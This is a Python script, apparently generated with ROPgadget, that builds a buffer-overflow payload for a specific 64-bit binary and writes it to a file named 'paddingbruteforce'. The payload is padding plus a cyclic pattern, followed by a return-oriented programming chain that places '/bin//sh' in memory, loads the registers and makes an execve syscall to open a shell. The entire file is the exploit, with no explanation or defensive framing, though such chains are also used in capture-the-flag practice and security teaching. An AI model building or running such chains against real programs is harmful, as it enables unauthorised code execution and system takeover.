#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = (pack('<Q', 0x0000000000400b91) + pack('<Q', 0x0000000000400b92)) * 100 
p += b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'

p += pack('<Q', 0x0000000000410123) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004005af) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000047f5f1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000410123) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444450) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f5f1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004006a6) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000410123) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000449115) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444450) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004012bc) # syscall

outputfile = open("paddingbruteforce", "wb")
outputfile.write(p)
outputfile.close()

